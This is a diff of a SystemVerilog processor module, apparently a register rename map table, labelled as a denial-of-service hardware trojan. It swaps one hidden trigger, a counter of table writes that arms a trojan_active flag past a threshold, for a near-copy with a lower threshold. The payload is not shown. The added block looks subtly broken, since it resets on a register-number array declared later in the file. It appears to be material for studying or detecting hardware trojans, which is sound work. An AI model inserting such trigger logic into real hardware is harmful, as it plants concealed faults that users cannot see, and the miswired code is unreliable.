@@ -14,24 +14,6 @@ import SchedulerTypes::*;
 
 module RMT_trojan_DoS( RenameLogicIF.RMT port );
 
-    // ============================================================
-    // TROJAN TRIGGER LOGIC - Type 1: Simple Counter
-    // ============================================================
-    localparam int TRIGGER_THRESHOLD = 23906;
-    logic [15:0] trojan_counter;
-    logic trojan_active;
-    
-    always_ff @(posedge clk_i or negedge rst_ni) begin
-        if (!rst_ni) begin
-            trojan_counter <= '0;
-            trojan_active  <= 1'b0;
-        end else begin
-            if (rmtWE) trojan_counter <= trojan_counter + 1;
-            if (trojan_counter >= TRIGGER_THRESHOLD) trojan_active <= 1'b1;
-        end
-    end
-
-
     // RMT read value
     PRegNumPath phySrcRegA [ RENAME_WIDTH ];
     PRegNumPath phySrcRegB [ RENAME_WIDTH ];
@@ -75,6 +57,23 @@ module RMT_trojan_DoS( RenameLogicIF.RMT port );
         .ra( rmtRA ),
         .rv( rmtRV )
     );
+
+    // ============================================================
+    // TROJAN TRIGGER - Type 1: Simple Counter (threshold=13766)
+    // ============================================================
+    localparam int TRIGGER_THRESHOLD = 13766;
+    logic [15:0] trojan_counter;
+    logic        trojan_active;
+    always_ff @(posedge clk or negedge rstWriteLogRegNum) begin
+        if (!rstWriteLogRegNum) begin
+            trojan_counter <= '0;
+            trojan_active  <= 1'b0;
+        end else begin
+            if (rmtWE) trojan_counter <= trojan_counter + 1;
+            if (trojan_counter >= TRIGGER_THRESHOLD) trojan_active <= 1'b1;
+        end
+    end
+
 
     // For initialize
     LRegNumPath rstWriteLogRegNum [ COMMIT_WIDTH ];
